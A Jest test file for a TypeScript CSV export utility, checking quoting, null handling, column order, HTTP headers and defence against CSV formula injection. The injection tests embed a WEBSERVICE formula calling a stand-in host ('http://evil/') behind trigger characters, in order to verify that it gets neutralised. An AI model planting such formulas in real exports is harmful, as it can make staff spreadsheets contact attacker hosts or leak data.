import { sendCsv, toCsv } from './csv.util';

describe('toCsv', () => {
  it('renders a header row and one row per record, in column order', () => {
    const csv = toCsv([
      { id: 1, name: 'Alice' },
      { id: 2, name: 'Bob' },
    ]);
    expect(csv).toBe('id,name\r\n1,Alice\r\n2,Bob\r\n');
  });

  it('quotes fields containing a comma', () => {
    const csv = toCsv([{ name: 'Doe, John' }]);
    expect(csv).toBe('name\r\n"Doe, John"\r\n');
  });

  it('quotes and doubles embedded quotes', () => {
    const csv = toCsv([{ note: 'He said "hi"' }]);
    expect(csv).toBe('note\r\n"He said ""hi"""\r\n');
  });

  it('quotes fields containing a newline', () => {
    const csv = toCsv([{ note: 'line1\nline2' }]);
    expect(csv).toBe('note\r\n"line1\nline2"\r\n');
  });

  it('renders null/undefined as an empty field', () => {
    const csv = toCsv([{ a: null, b: undefined, c: 0 }]);
    expect(csv).toBe('a,b,c\r\n,,0\r\n');
  });

  it('respects an explicit column list and order, even with empty rows', () => {
    expect(toCsv([], ['a', 'b'])).toBe('a,b\n');
    const csv = toCsv([{ b: 2, a: 1 }], ['a', 'b']);
    expect(csv).toBe('a,b\r\n1,2\r\n');
  });

  describe('CSV injection', () => {
    // Exports carry attacker-influenceable free text (lead names,
    // collection remarks, and customer feedback, which arrives through an
    // unauthenticated endpoint). A cell starting with any of these is
    // evaluated as a formula when a staff member opens the file.
    it.each(['=', '+', '-', '@', '\t', '\r'])(
      'neutralises a cell starting with %j',
      (trigger) => {
        const csv = toCsv([{ note: `${trigger}WEBSERVICE("http://evil/")` }]);
        expect(csv).toBe(
          `note\r\n"'${trigger}WEBSERVICE(""http://evil/"")"\r\n`,
        );
      },
    );

    it('leaves an ordinary value untouched and unquoted', () => {
      expect(toCsv([{ name: 'Ramesh Kumar' }])).toBe(
        'name\r\nRamesh Kumar\r\n',
      );
    });

    it('does not treat a negative number as a formula trigger by accident', () => {
      // A leading "-" IS a trigger, so a negative amount gets guarded too.
      // That's intentional — it displays identically and there is no way to
      // distinguish "-500" from "-1+1" without parsing spreadsheet syntax.
      expect(toCsv([{ amount: -500 }])).toBe('amount\r\n"\'-500"\r\n');
    });
  });
});

describe('sendCsv', () => {
  function makeResponse() {
    return {
      set: jest.fn().mockReturnThis(),
      send: jest.fn(),
    };
  }

  it('sets CSV content-type/disposition headers and sends the serialized rows', () => {
    const res = makeResponse();
    sendCsv(res as never, 'report.csv', [{ id: 1, name: 'Alice' }]);

    expect(res.set).toHaveBeenCalledWith({
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': 'attachment; filename="report.csv"',
    });
    expect(res.send).toHaveBeenCalledWith('id,name\r\n1,Alice\r\n');
  });

  it('sends just the header row (no crash) for an empty result set', () => {
    const res = makeResponse();
    sendCsv(res as never, 'empty.csv', [], ['id', 'name']);

    expect(res.send).toHaveBeenCalledWith('id,name\n');
  });
});
